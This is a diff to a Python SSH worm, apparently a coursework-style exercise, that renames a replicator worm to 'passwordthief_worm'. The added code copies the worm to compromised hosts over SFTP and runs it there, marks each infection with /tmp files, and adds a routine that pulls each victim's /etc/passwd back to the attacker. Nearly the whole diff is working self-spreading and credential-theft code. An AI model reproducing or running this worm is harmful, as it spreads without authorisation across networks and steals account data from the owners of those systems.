@@ -20,6 +20,21 @@ HostIP=[]
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
+
+
+def getpasswordback(sshClient,HostIp,host):
+
+		print("***************getting Password***********")
+		print("start to copy")
+		#copy attack system
+		sftpClient = sshClient.open_sftp()
+		remotepath = '/etc/passwd'
+		localpath = '/home/passwd_'+host
+		print(host)
+		sftpClient.get(remotepath, localpath)
+		#make this system as getting the input
+		sftpClient.put("/tmp/GotPassword.txt","/tmp/GotPassword.txt")
+		
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
@@ -81,15 +96,16 @@ def spreadAndExecute(sshClient,systemIP1):
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
 	if len(sys.argv) < 2:
-		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
+		sftpClient.put("/tmp/passwordthief_worm.py","/tmp/passwordthief_worm.py")
 
 
 	else:
-		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+		sftpClient.put("passwordthief_worm.py","/tmp/passwordthief_worm.py")
 
 
-	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
-	sshClient.exec_command("python /tmp/replicator_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")
+	sshClient.exec_command("python /tmp/passwordthief_worm.py")
+	pass
 
 	
 	
@@ -305,7 +321,7 @@ for host in attackList:
 	sshInfo =  attackSystem(host)
 	
 	print sshInfo
-	count =0
+	
 	
 	# Did the attack succeed?
 	if sshInfo:
@@ -359,22 +375,16 @@ for host in attackList:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
-			if count == 0:
-				count + 1
+			
+				
 				print("inside if isInfectedSytem() statement ")
 				spreadAndExecute(sshInfo[0],HostIP)
 				print("done infecting")
-			else:
-				getpasswordback(sshInfo[0],HostIP[host])
+		try:
+				sftpClient.stat("/tmp/GotPassword.txt")
+		except:
+				print("We are getting it"+host )
+				getpasswordback(sshInfo[0],HostIP,host)
 
 			
-def getpasswordback(sshClient,HostIp):
-
-	print("***************getting Password***********")
-		print("start to copy")
-		#copy attack system
-		sftpClient = sshClient.open_sftp()
-		remotepath = '/etc/passwd'
-		localpath = '/home/passwd_'+HostIp
-		sftpClient.get(remotepath, localpath)
 
